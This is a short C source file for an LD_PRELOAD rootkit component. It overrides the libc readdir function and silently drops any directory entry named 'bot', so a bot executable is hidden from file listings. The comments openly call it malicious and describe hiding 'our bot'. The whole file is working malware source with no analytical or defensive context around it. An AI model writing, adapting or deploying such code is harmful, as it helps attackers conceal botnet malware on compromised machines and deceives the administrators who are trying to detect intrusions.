#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// The name of our bot executable to hide
#define FILENAME_TO_HIDE "bot"

// Original readdir function pointer
typedef struct dirent *(*readdir_t)(DIR *dirp);
static readdir_t old_readdir = NULL;

// Our malicious readdir function
struct dirent *readdir(DIR *dirp) {
    if (old_readdir == NULL) {
        old_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir;
    while ((dir = old_readdir(dirp))) {
        // If the entry is our bot file, skip it and get the next one
        if (strcmp(dir->d_name, FILENAME_TO_HIDE) == 0) {
            continue;
        }
        break;
    }
    return dir;
}
